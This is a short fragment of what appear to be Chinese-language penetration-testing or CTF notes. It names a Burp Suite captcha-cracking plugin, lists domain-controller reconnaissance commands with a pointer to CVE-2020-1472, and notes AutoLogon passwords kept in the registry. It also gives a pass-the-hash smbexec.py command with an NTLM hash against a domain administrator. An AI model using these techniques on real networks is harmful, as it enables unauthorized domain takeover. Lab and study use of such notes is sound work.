...
Burpsuite插件[识别简单验证码](https://blog.csdn.net/m0_70389551/article/details/137396372)：[captcha-killer-modified](https://github.com/f0ng/captcha-killer-modified)
...
>net group "Domain controllers" /Domain     #查看域控制器，默认开445，88，53（DNS），389（LDAP）端口，CVE-2020-1472，ipconfig找DNS服务器
>net time /domain  #查询域时间设置（多半域控作为时间服务器）
...
#AutoLogon用于自动登录，无需输入密码，但密码会保存到注册表
...
python D:\ctf\software\Python27\Scripts\smbexec.py -hashes:570a9a65db8fba761c1008a51d4c95ab hack-my.com/administrator@10.10.10.19
```
